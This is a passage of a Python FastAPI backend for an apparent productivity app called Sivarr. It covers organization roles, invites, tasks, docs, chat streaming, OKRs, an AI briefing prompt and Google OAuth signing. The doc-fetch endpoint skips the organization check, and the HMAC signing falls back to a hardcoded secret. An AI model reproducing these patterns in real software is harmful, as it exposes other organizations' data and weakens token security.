    target = sanitize_text(str(data.get("sid", "")), 40)
    role   = sanitize_text(str(data.get("role", "")), 20)
    if role not in ("admin", "manager", "member", "guest"):
        raise HTTPException(400, "Invalid role.")
    if target == org.get("owner_sid"):
        raise HTTPException(400, "The owner's role can't be changed.")
    if not db.set_org_member_role(org["id"], target, role):
        raise HTTPException(404, "Member not found.")
    members = db.get_org_members(org["id"])
    tname = next((m.get("name") for m in members if _org_member_sid(m) == target), target[:8])
    _org_audit(org["id"], sid, actor, f"Set {tname}'s role to {role}")
    return {"ok": True}


@app.post("/api/org/member/remove")
async def org_member_remove(data: dict):
    sid, actor = _resolve_token(data)
    if not db.is_available():
        raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org:
        raise HTTPException(404, "You don't belong to an organization.")
    if org.get("member_role") not in ("owner", "admin"):
        raise HTTPException(403, "Only owners and admins can remove members.")
    target = sanitize_text(str(data.get("sid", "")), 40)
    if target == sid:
        raise HTTPException(400, "You can't remove yourself.")
    tgt = next((m for m in db.get_org_members(org["id"]) if _org_member_sid(m) == target), None)
    if not tgt:
        raise HTTPException(404, "Member not found.")
    trole = tgt.get("role", "member")
    if trole == "owner":
        raise HTTPException(400, "The owner can't be removed.")
    if org.get("member_role") == "admin" and trole in ("admin", "manager"):
        raise HTTPException(403, "Admins can only remove members and guests.")
    if not db.remove_org_member(org["id"], target):
        raise HTTPException(404, "Member not found.")
    _org_audit(org["id"], sid, actor, f"Removed {tgt.get('name', target[:8])} ({trole})")
    return {"ok": True}


@app.post("/api/org/audit")
async def org_audit_list(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available():
        raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org:
        raise HTTPException(404, "You don't belong to an organization.")
    if org.get("member_role") not in ("owner", "admin"):
        raise HTTPException(403, "Only owners and admins can view the audit log.")
    rows = sorted(db.coll_list("org_audit", owner=org["id"]), key=lambda a: a.get("ts", ""), reverse=True)
    return {"ok": True, "audit": rows[:100]}


@app.post("/api/org/invite")
async def org_invite(data: dict, request: Request, bg: BackgroundTasks):
    sid, uname = _resolve_token(data)
    # Throttle invites: this endpoint emails an attacker-supplied address from our
    # trusted domain, so cap it per inviter to prevent spam/phishing relay abuse.
    check_rate_limit(get_client_key(request, sid), 10, "org_invite")
    if not db.is_available():
        raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org:
        raise HTTPException(404, "You don't belong to an organization.")
    if org.get("member_role") not in ("owner", "admin", "manager"):
        raise HTTPException(403, "Only owners, admins, and managers can invite members.")
    # Seat enforcement (only once the org is on a paid seat plan — legacy orgs unaffected).
    if _org_sub_active(org):
        seats_paid = ((org.get("settings") or {}).get("subscription") or {}).get("seats", 0)
        if db.count_org_members(org["id"]) >= seats_paid:
            raise HTTPException(402, f"All {seats_paid} seats are in use. Add seats to invite more members.")
    email = sanitize_text(str(data.get("email", "")).strip().lower(), 120)
    if not email or "@" not in email:
        raise HTTPException(400, "Valid email required.")
    role  = sanitize_text(str(data.get("role", "member")), 20)
    if role not in ("admin", "manager", "member", "guest"):
        role = "member"
    token      = secrets.token_urlsafe(32)
    expires_at = datetime.datetime.utcnow() + datetime.timedelta(days=7)
    ok = db.create_org_invite(org["id"], email, role, sid, token, expires_at)
    if not ok:
        raise HTTPException(500, "Failed to create invite.")
    join_url = f"{BASE_URL}/?org_invite={token}"
    bg.add_task(send_email, email,
                f"You're invited to join {org['name']} on Sivarr",
                _email_org_invite_html(uname, org["name"], join_url, role))
    # If the invitee already has a Sivarr account, also web-push them (pop-up)
    # so the invite reaches them in-app, not just by email.
    existing = db.get_user_by_email(email) if db.is_available() else None
    if existing and existing.get("sid"):
        bg.add_task(send_push, existing["sid"], f"📨 Invited to {org['name']}",
                    f"{uname} invited you to join {org['name']} on Sivarr.", "/app", f"orginvite_{org['id']}")
    log.info(f"Org invite: {email} → {org['name']} as {role}")
    return {"ok": True}


@app.get("/api/org/invites/pending")
async def org_invites_pending(token: str = ""):
    """Pending (unused, unexpired) org invites for the signed-in user's email —
    surfaced in-app on sign-in so an invite isn't lost if the email is missed."""
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    if not db.is_available():
        return {"invites": []}
    email = sess.get("email", "") or load_progress(sess["sid"]).get("email", "")
    if not email:
        return {"invites": []}
    invs = await asyncio.to_thread(db.get_pending_invites_for_email, email)
    return {"invites": [
        {"token": i["token"], "org_id": i["org_id"],
         "org_name": i.get("org_name", ""), "role": i.get("role", "member")}
        for i in invs
    ]}


@app.get("/api/org/join/{token}")
async def org_join_link(token: str):
    """Redirect invite links to the app — the client handles actual join."""
    return RedirectResponse(url=f"/?org_invite={token}", status_code=302)


@app.post("/api/org/join")
async def org_join(data: dict, bg: BackgroundTasks):
    """Accept an org invite — called by the client after the user logs in."""
    sid, _ = _resolve_token(data)
    if not db.is_available():
        raise HTTPException(503, "Database unavailable.")
    # BUG FIX: the invite token arrives as `invite_token` (the body's `token`
    # field is the SESSION token, consumed by _resolve_token above). Reading
    # `token` here looked up the invite under the session token → never found →
    # the member was never added.
    invite_token = sanitize_text(str(data.get("invite_token", "")), 100)
    if not invite_token:
        raise HTTPException(400, "Invite token required.")
    invite = db.get_org_invite(invite_token)
    if not invite:
        raise HTTPException(404, "Invite not found or already used.")
    # expires_at is a tz-aware TIMESTAMPTZ from the DB; comparing it against a
    # naive utcnow() raises TypeError (offset-naive vs offset-aware) → 500 on
    # every join. Normalise both to aware-UTC before comparing.
    _exp = invite["expires_at"]
    if _exp.tzinfo is None:
        _exp = _exp.replace(tzinfo=datetime.timezone.utc)
    if _exp < datetime.datetime.now(datetime.timezone.utc):
        raise HTTPException(410, "This invite link has expired.")
    # Seat enforcement at the authoritative point (covers invites created before the
    # seat limit was hit). Only applies to orgs on a paid seat plan.
    _join_org = db.get_org(invite["org_id"])
    if _join_org and _org_sub_active(_join_org):
        seats_paid = ((_join_org.get("settings") or {}).get("subscription") or {}).get("seats", 0)
        if db.count_org_members(invite["org_id"]) >= seats_paid:
            raise HTTPException(402, "All seats in this organisation are in use. Ask the owner to add seats.")
    ok = db.use_org_invite(invite_token, sid)
    if not ok:
        raise HTTPException(500, "Failed to join organization.")
    org = db.get_org_by_member(sid)
    org_name = org["name"] if org else ""
    # Notify the new member: web push (pop-up) now they're in the app, plus the
    # org owner gets a heads-up that someone joined.
    if org:
        bg.add_task(send_push, sid, f"🎉 Welcome to {org_name}",
                    f"You're now a member of {org_name}.", "/app", f"orgjoin_{org['id']}")
        owner_sid = org.get("owner_sid")
        if owner_sid and owner_sid != sid:
            bg.add_task(send_push, owner_sid, f"👥 {org_name}: new member",
                        "Someone just joined your organization.", "/app", f"orgjoined_{org['id']}")
    return {"ok": True, "org_name": org_name}


@app.post("/api/org/tasks")
async def org_tasks_list(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    project_id = data.get("project_id")
    limit  = min(int(data.get("limit",  500)), 1000)
    offset = max(int(data.get("offset", 0)),   0)
    tasks = db.get_org_tasks(org["id"], project_id, limit=limit, offset=offset)
    return {"tasks": tasks}


@app.post("/api/org/tasks/create")
async def org_task_create(data: dict, bg: BackgroundTasks):
    sid, uname = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    title = sanitize_text(str(data.get("title", "")).strip(), 200)
    if not title: raise HTTPException(400, "Task title required.")
    task_id    = uuid.uuid4().hex[:20]
    status     = sanitize_text(str(data.get("status", "todo")), 20)
    priority   = sanitize_text(str(data.get("priority", "normal")), 20)
    desc       = sanitize_text(str(data.get("description", "")), 2000)
    assignee   = sanitize_text(str(data.get("assignee_sid", "")), 40) or None
    project_id = sanitize_text(str(data.get("project_id", "")), 40) or None
    due_date   = sanitize_text(str(data.get("due_date", "")), 10) or None
    ok = db.create_org_task(org["id"], task_id, title, sid, status, priority, desc, assignee, project_id, due_date)
    if not ok: raise HTTPException(500, "Failed to create task.")
    # C1: notify the assignee on delegation (web push; no-op if they have no
    # push subscription). Skip self-assignment.
    if assignee and assignee != sid:
        bg.add_task(send_push, assignee,
                    f"📋 {org.get('name', 'Your team')}: new task assigned",
                    f"{uname} assigned you: {title}", "/app", f"orgtask_{task_id}")
    return {"ok": True, "task_id": task_id}


@app.post("/api/org/tasks/update")
async def org_task_update(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    task_id = sanitize_text(str(data.get("task_id", "")), 40)
    if not task_id: raise HTTPException(400, "task_id required.")
    allowed = {"title", "description", "status", "priority", "assignee_sid", "project_id", "due_date"}
    # v can be None (clearing due_date/assignee_sid/project_id) — str(None) would send
    # the literal "None" to a `date`/uuid column and 500. Pass nulls through untouched.
    updates = {k: (v if v is None else sanitize_text(str(v), 2000)) for k, v in data.items() if k in allowed}
    db.update_org_task(task_id, updates, org["id"])
    return {"ok": True}


@app.post("/api/org/tasks/delete")
async def org_task_delete(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    task_id = sanitize_text(str(data.get("task_id", "")), 40)
    if not task_id: raise HTTPException(400, "task_id required.")
    db.delete_org_task(task_id, org["id"])
    return {"ok": True}


@app.post("/api/org/projects")
async def org_projects_list(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    return {"projects": db.get_org_projects(org["id"])}


@app.post("/api/org/projects/create")
async def org_project_create(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    name = sanitize_text(str(data.get("name", "")).strip(), 120)
    if not name: raise HTTPException(400, "Project name required.")
    project_id = uuid.uuid4().hex[:20]
    desc  = sanitize_text(str(data.get("description", "")), 500)
    color = sanitize_text(str(data.get("color", "#41076B")), 20)
    ok = db.create_org_project(org["id"], project_id, name, sid, desc, color)
    if not ok: raise HTTPException(500, "Failed to create project.")
    return {"ok": True, "project_id": project_id}


@app.post("/api/org/projects/update")
async def org_project_update(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    project_id = sanitize_text(str(data.get("project_id", "")), 40)
    if not project_id: raise HTTPException(400, "project_id required.")
    allowed = {"name", "description", "status", "color"}
    updates = {k: sanitize_text(str(v), 500) for k, v in data.items() if k in allowed}
    db.update_org_project(project_id, updates, org["id"])
    return {"ok": True}


@app.post("/api/org/docs")
async def org_docs_list(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    return {"docs": db.get_org_docs(org["id"])}


@app.post("/api/org/docs/save")
async def org_doc_save(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    doc_id  = sanitize_text(str(data.get("doc_id", "") or uuid.uuid4().hex[:20]), 40)
    title   = sanitize_text(str(data.get("title", "Untitled Doc")).strip(), 200)
    content = sanitize_text(str(data.get("content", "")), 50000)
    ok = db.save_org_doc(org["id"], doc_id, title, content, sid)
    if not ok: raise HTTPException(500, "Failed to save doc.")
    return {"ok": True, "doc_id": doc_id}


@app.post("/api/org/docs/get")
async def org_doc_get(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    doc_id = sanitize_text(str(data.get("doc_id", "")), 40)
    if not doc_id: raise HTTPException(400, "doc_id required.")
    doc = db.get_org_doc(doc_id)
    if not doc: raise HTTPException(404, "Doc not found.")
    return {"doc": doc}


@app.post("/api/org/docs/delete")
async def org_doc_delete(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    doc_id = sanitize_text(str(data.get("doc_id", "")), 40)
    if not doc_id: raise HTTPException(400, "doc_id required.")
    db.delete_org_doc(doc_id, org["id"])
    return {"ok": True}


@app.post("/api/org/messages")
async def org_messages_list(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    channel = sanitize_text(str(data.get("channel", "general")), 60)
    msgs = db.get_org_messages(org["id"], channel)
    return {"messages": msgs}


@app.post("/api/org/messages/send")
async def org_message_send(data: dict, bg: BackgroundTasks):
    sid, uname = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    content = sanitize_text(str(data.get("content", "")).strip(), 2000)
    if not content: raise HTTPException(400, "Message content required.")
    channel = sanitize_text(str(data.get("channel", "general")), 60)
    msg = db.send_org_message(org["id"], channel, sid, uname, content)
    if not msg: raise HTTPException(500, "Failed to send message.")

    # ── @mention email notifications ─────────────────────────────
    import re as _re
    raw_mentions = _re.findall(r'@(\w+)', content)
    if raw_mentions:
        members = db.get_org_members(org["id"])
        for m in members:
            if m["sid"] == sid:
                continue  # don't notify the sender
            first_word = (m["name"] or "").split()[0].lower()
            if any(mention.lower() == first_word for mention in raw_mentions):
                bg.add_task(
                    send_email,
                    m["email"],
                    f"{uname} mentioned you in #{channel} · {org['name']}",
                    _email_org_mention_html(m["name"], uname, org["name"], channel, content),
                )

    return {"ok": True}


@app.get("/api/org/chat/stream")
async def org_chat_stream(token: str = "", last_id: int = 0, request: Request = None):
    """SSE endpoint — polls PostgreSQL for new messages so all Gunicorn workers see the same feed."""
    token = sanitize_text(token, 100)
    entry = get_session_from_token(token)
    if not entry: raise HTTPException(401, "Invalid token.")
    sid = entry["sid"]
    if not db.is_available(): raise HTTPException(503, "DB unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    org_id = org["id"]
    cursor = max(0, int(last_id))

    async def stream():
        nonlocal cursor
        # Announcement cursor: baseline to the DB clock so we only push announcements
        # created *after* this connection (existing ones load via /api/org/announcements).
        ann_cursor = await asyncio.to_thread(db.db_now)
        while True:
            if request and await request.is_disconnected():
                break
            sent = False
            # ── New chat messages ──
            msgs = await asyncio.to_thread(db.get_org_messages_since, org_id, cursor)
            for msg in msgs:
                cursor = msg["id"]
                payload = {
                    "id":          msg["id"],
                    "channel":     msg["channel"],
                    "content":     msg["content"],
                    "author_sid":  msg["author_sid"],
                    "author_name": msg["author_name"],
                    "created_at":  msg["created_at"].isoformat() if hasattr(msg["created_at"], "isoformat") else str(msg["created_at"]),
                }
                yield f"data: {json.dumps(payload)}\n\n"
                sent = True
            # ── New announcements (org-wide) ──
            if ann_cursor is not None:
                anns = await asyncio.to_thread(db.get_org_announcements_since, org_id, ann_cursor)
                for a in anns:
                    ann_cursor = a["created_at"]
                    ann = {
                        "id":          a["id"],
                        "org_id":      a.get("org_id", org_id),
                        "title":       a["title"],
                        "body":        a.get("body", ""),
                        "author_sid":  a.get("author_sid", ""),
                        "author_name": a.get("author_name", ""),
                        "pinned":      a.get("pinned", False),
                        "created_at":  a["created_at"].isoformat() if hasattr(a["created_at"], "isoformat") else str(a["created_at"]),
                    }
                    yield f"data: {json.dumps({'type': 'announcement', 'ann': ann})}\n\n"
                    sent = True
            if not sent:
                yield ": ping\n\n"
            await asyncio.sleep(2)

    return StreamingResponse(
        stream(),
        media_type="text/event-stream",
        headers={
            "Cache-Control":    "no-cache",
            "X-Accel-Buffering":"no",
            "Connection":       "keep-alive",
        },
    )


@app.get("/api/org/channels")
async def org_channels(token: str = ""):
    token = sanitize_text(token, 100)
    entry = get_session_from_token(token)
    if not entry: raise HTTPException(401, "Invalid token.")
    return {"channels": DEFAULT_CHANNELS}


@app.post("/api/org/presence")
async def org_presence_ping(data: dict):
    sid, uname = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "DB unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization.")
    await asyncio.to_thread(db.upsert_presence, sid, org["id"], uname)
    return {"ok": True}


@app.get("/api/org/presence")
async def org_presence_list(token: str = ""):
    token = sanitize_text(token, 100)
    entry = get_session_from_token(token)
    if not entry: raise HTTPException(401, "Invalid token.")
    if not db.is_available(): return {"online": []}
    org = db.get_org_by_member(entry["sid"])
    if not org: return {"online": []}
    online = await asyncio.to_thread(db.get_presence, org["id"])
    return {"online": online}


# ── Goals & OKRs ──────────────────────────────────────────────────────────────

@app.post("/api/org/goals")
async def org_goals_list(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    goals = db.get_org_goals(org["id"])
    return {"goals": goals}


@app.post("/api/org/goals/create")
async def org_goal_create(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    title = sanitize_text(str(data.get("title", "")).strip(), 200)
    if not title: raise HTTPException(400, "Goal title required.")
    goal_id = f"og_{sid[:8]}_{int(__import__('time').time()*1000)}"
    db.create_org_goal(
        org_id=org["id"], goal_id=goal_id, title=title,
        created_by=sid,
        description=sanitize_text(str(data.get("description", "")), 500),
        goal_type=sanitize_text(str(data.get("type", "okr")), 20),
        owner_sid=sid,
        due_date=data.get("due_date") or None,
    )
    return {"ok": True, "goal_id": goal_id}


@app.post("/api/org/goals/update")
async def org_goal_update(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    goal_id = str(data.get("goal_id", ""))
    if not goal_id: raise HTTPException(400, "goal_id required.")
    db.update_org_goal(
        goal_id=goal_id, org_id=org["id"],
        title=sanitize_text(str(data["title"]), 200) if "title" in data else None,
        description=sanitize_text(str(data["description"]), 500) if "description" in data else None,
        status=data.get("status"),
        progress=int(data["progress"]) if "progress" in data else None,
        due_date=data.get("due_date"),
    )
    return {"ok": True}


@app.post("/api/org/goals/delete")
async def org_goal_delete(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    goal_id = str(data.get("goal_id", ""))
    if not goal_id: raise HTTPException(400, "goal_id required.")
    db.delete_org_goal(goal_id, org["id"])
    return {"ok": True}


@app.post("/api/org/goals/kr/create")
async def org_kr_create(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    goal_id = str(data.get("goal_id", ""))
    title   = sanitize_text(str(data.get("title", "")).strip(), 200)
    if not goal_id or not title: raise HTTPException(400, "goal_id and title required.")
    kr_id = f"kr_{sid[:8]}_{int(__import__('time').time()*1000)}"
    db.create_org_key_result(
        kr_id=kr_id, goal_id=goal_id, org_id=org["id"], title=title,
        target_value=float(data.get("target_value", 100)),
        unit=sanitize_text(str(data.get("unit", "%")), 20),
    )
    return {"ok": True, "kr_id": kr_id}


@app.post("/api/org/goals/kr/update")
async def org_kr_update(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    kr_id = str(data.get("kr_id", ""))
    if not kr_id: raise HTTPException(400, "kr_id required.")
    db.update_org_key_result(
        kr_id=kr_id, org_id=org["id"],
        current_value=float(data["current_value"]) if "current_value" in data else None,
        status=data.get("status"),
    )
    return {"ok": True}


# ── Founder Mode ──────────────────────────────────────────────────────────────

@app.post("/api/org/founder/get")
async def org_founder_get(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    founder = db.get_org_founder(org["id"])
    return {"founder": founder}


@app.post("/api/org/founder/save")
async def org_founder_save(data: dict):
    sid, _ = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")
    if org.get("member_role") not in ("owner", "admin"):
        raise HTTPException(403, "Only owners and admins can edit founder data.")
    db.save_org_founder(
        org_id=org["id"],
        burn_rate=float(data.get("burn_rate", 0)),
        cash_balance=float(data.get("cash_balance", 0)),
        mrr=float(data.get("mrr", 0)),
        arr=float(data.get("arr", 0)),
        funding_stage=sanitize_text(str(data.get("funding_stage", "pre-seed")), 50),
        total_raised=float(data.get("total_raised", 0)),
        investors=data.get("investors", []),
        milestones=data.get("milestones", []),
    )
    return {"ok": True}


# ── Sivarr AI Org Briefing ───────────────────────────────────────────────────────

@app.post("/api/org/ai/briefing")
async def org_ai_briefing(data: dict):
    sid, uname = _resolve_token(data)
    if not db.is_available(): raise HTTPException(503, "Database unavailable.")
    org = db.get_org_by_member(sid)
    if not org: raise HTTPException(404, "No organization found.")

    tasks    = db.get_org_tasks(org["id"], limit=100)
    members  = db.get_org_members(org["id"])
    projects = db.get_org_projects(org["id"])
    goals    = db.get_org_goals(org["id"])
    founder  = db.get_org_founder(org["id"])

    from datetime import date
    today = date.today().isoformat()
    open_tasks   = [t for t in tasks if t["status"] != "done"]
    done_tasks   = [t for t in tasks if t["status"] == "done"]
    overdue      = [t for t in open_tasks if t.get("due_date") and str(t["due_date"]) < today]
    high_pri     = [t for t in open_tasks if t.get("priority") == "high"]
    active_goals = [g for g in goals if g.get("status") == "active"]

    context = f"""You are Sivarr, the AI operating intelligence for {org['name']}.
Generate a concise executive briefing for {uname} (role: {org.get('member_role','member')}).

Organization snapshot ({today}):
- Members: {len(members)}
- Open tasks: {len(open_tasks)} | Done: {len(done_tasks)} | Overdue: {len(overdue)} | High priority: {len(high_pri)}
- Projects: {len(projects)} active
- Goals: {len(active_goals)} active OKRs
- MRR: ₦{founder.get('mrr', 0):,.0f} | Burn rate: ₦{founder.get('burn_rate', 0):,.0f}/mo | Runway: {round(founder['cash_balance']/founder['burn_rate']) if founder.get('burn_rate',0) > 0 and founder.get('cash_balance',0) > 0 else 'N/A'} months

Top overdue tasks: {', '.join([t['title'] for t in overdue[:3]]) or 'None'}
High priority: {', '.join([t['title'] for t in high_pri[:3]]) or 'None'}

Write a 3–5 sentence executive briefing. Be direct and actionable. Highlight risks, wins, and the #1 priority today. No bullet points, flowing prose. Never use em dashes, use commas or periods instead."""

    sessions = get_sessions(sid)
    briefing = await async_gemini_ask(sessions["chat"], context)
    return {"briefing": briefing}


# /api/home/brief now lives in routes/home_brief.py.


@app.get("/api/home/briefing")
async def home_briefing_data(token: str = ""):
    """Return structured home-panel data assembled from real user data — no AI call."""
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid = sess["sid"]
    import datetime as _dt
    today = str(_dt.date.today())
    hr    = _dt.datetime.now().hour
    greeting = "Good morning" if hr < 12 else "Good afternoon" if hr < 17 else "Good evening"

    tasks  = load_tasks(sid)
    habits = load_habits(sid)
    goals  = load_goals(sid)

    tasks_due_today = sum(1 for t in tasks if not t.get("done") and t.get("date") == today)
    overdue_tasks   = sum(1 for t in tasks if not t.get("done") and t.get("date","") and t.get("date","") < today)
    active_goals    = sum(1 for g in goals if not g.get("completed") and not g.get("done"))
    goals_at_risk   = sum(1 for g in goals
                          if not g.get("completed") and not g.get("done")
                          and g.get("due") and g.get("due") < today)

    # Streak: count consecutive days any habit was completed
    streak_days = 0
    if habits:
        all_completions = set()
        for h in habits:
            for d in (h.get("completions") or []):
                all_completions.add(d)
        d = _dt.date.today()
        while str(d) in all_completions:
            streak_days += 1
            d -= _dt.timedelta(days=1)

    return {
        "tasks_due_today": tasks_due_today,
        "overdue_tasks":   overdue_tasks,
        "streak_days":     streak_days,
        "active_goals":    active_goals,
        "goals_at_risk":   goals_at_risk,
        "greeting":        greeting,
    }


# JOURNAL_PROMPTS and /api/journal/prompt now live in routes/journal.py.


@app.get("/api/analytics/mood")
async def analytics_mood(token: str = "", days: int = 30):
    """Return mood data from journal entries for the last N days."""
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid = sess["sid"]
    import datetime as _dt
    days   = max(7, min(days, 90))
    # Quota gating: free plan sees only a 7-day analytics window; paid = full.
    cap_days = _plan_caps(load_progress(sid)).get("analytics_days")
    if cap_days is not None:
        days = min(days, cap_days)
    cutoff = str(_dt.date.today() - _dt.timedelta(days=days))
    entries = load_journal(sid)

    SCORE = {"great": 5, "good": 4, "okay": 3, "low": 2, "stressed": 1}
    # The journal UI stores mood as an emoji; map it to the keyword the chart expects.
    EMOJI = {"😊": "great", "🙂": "good", "😐": "okay", "😔": "low", "😤": "stressed"}
    result = []
    for e in entries:
        d = e.get("date", "")
        m = e.get("mood", "")
        m = EMOJI.get(m, m)
        if d and d >= cutoff and m in SCORE:
            result.append({"date": d, "mood": m, "mood_score": SCORE[m]})

    result.sort(key=lambda x: x["date"])
    return {"data": result}


# /api/ai/extract-tasks, /api/ai/write, /api/ai/weekly-review,
# /api/ai/weekly-review/latest, /api/ai/parse-intent, /api/ai/voice-to-task
# now live in routes/ai_features.py.


@app.post("/api/feedback")
async def submit_feedback(data: dict):
    token = sanitize_text(str(data.get("token", "")), 100)
    if not token:
        raise HTTPException(401, "Token required.")
    entry = get_session_from_token(token)
    if not entry:
        raise HTTPException(401, "Session expired.")
    sid  = entry["sid"]
    text = sanitize_text(str(data.get("text", "")), 1000)
    if not text:
        raise HTTPException(400, "Feedback text required.")
    rating = data.get("rating")
    if rating is not None:
        try:
            rating = int(rating)
            if not 1 <= rating <= 5:
                rating = None
        except (ValueError, TypeError):
            rating = None
    page = sanitize_text(str(data.get("page", "")), 200)
    saved = db.save_feedback(sid, rating, text, page) if db.is_available() else False
    log.info(f"Feedback: sid={sid} rating={rating} page={page} saved_to_db={saved}")
    return {"ok": True}


# ═══════════════════════════════════════════════════════════════
#  GOOGLE OAUTH — Sign in with Google
# ═══════════════════════════════════════════════════════════════
#
# Security design:
#   • state  = HMAC-signed nonce so the callback can't be forged (CSRF protection)
#   • After a successful login, a one-time exchange CODE (not the real session token)
#     is stored in _google_exchange_codes for 120 s.  The browser receives only the
#     short code in the redirect URL; the real token is fetched server-side via
#     GET /api/auth/google/exchange?code=…  This keeps session tokens out of URLs,
#     browser history, and server logs.
# ─────────────────────────────────────────────────────────────────────────────────

# In-memory fallback for exchange codes (used when DB unavailable, e.g. dev mode)
_google_exchange_codes_mem: dict = {}   # code -> {token, expires}


def _google_redirect_uri() -> str:
    return f"{BASE_URL.rstrip('/')}/auth/google/callback"


def _google_make_state() -> str:
    """Generate a signed, time-limited state nonce for CSRF protection.
    Purely HMAC-based — no per-worker dict, safe across all gunicorn workers."""
    nonce   = secrets.token_hex(16)
    expires = time.time() + 300          # 5-minute window
    sig     = hmac.new(
        (GOOGLE_CLIENT_SECRET or "sivarr-fallback").encode(),
        f"{nonce}:{expires:.0f}".encode(),
        "sha256",
    ).hexdigest()[:16]
    return f"{nonce}.{expires:.0f}.{sig}"


def _google_verify_state(state: str) -> bool:
    """Return True if state HMAC is valid and unexpired.
    Purely cryptographic — no server-side nonce registry needed."""
    try:
        nonce, exp_str, sig = state.split(".")
        if time.time() > float(exp_str):
            return False
        expected = hmac.new(
            (GOOGLE_CLIENT_SECRET or "sivarr-fallback").encode(),
            f"{nonce}:{exp_str}".encode(),
            "sha256",
        ).hexdigest()[:16]
        return hmac.compare_digest(sig, expected)
    except Exception:
        return False


# ── Stateless Google exchange code (HMAC-signed, cross-worker safe) ──────────
# The code carries only the user identity (no session token) and is signed with
# the OAuth client secret. Any gunicorn worker can verify it without shared
# storage — eliminating the DB / in-memory cross-worker handoff the opaque-xcode
# design depended on. The session token is minted at exchange time so it never
# travels in a URL; the short TTL bounds replay.

def _google_xcode_key() -> bytes:
    return (GOOGLE_CLIENT_SECRET or "sivarr-fallback").encode() + b":xcode-v1"


def _google_make_xcode(sid: str, name: str, email: str) -> str:
    """Create a 2-minute, HMAC-signed one-time code carrying the Google identity."""
    import base64
    payload = json.dumps(
        {"sid": sid, "name": name, "email": email, "exp": int(time.time()) + 120},
        separators=(",", ":"),
    ).encode()
    raw = base64.urlsafe_b64encode(payload).decode().rstrip("=")
    sig = hmac.new(_google_xcode_key(), raw.encode(), "sha256").hexdigest()[:32]
    return f"{raw}.{sig}"


def _google_verify_xcode(code: str) -> dict | None:
    """Verify a signed Google code; return {sid, name, email} or None."""
    import base64
    try:
        raw, sig = code.split(".", 1)
        expected = hmac.new(_google_xcode_key(), raw.encode(), "sha256").hexdigest()[:32]
        if not hmac.compare_digest(sig, expected):
            return None
        pad = "=" * (-len(raw) % 4)
        payload = json.loads(base64.urlsafe_b64decode(raw + pad))
        if int(payload.get("exp", 0)) < time.time():
            return None
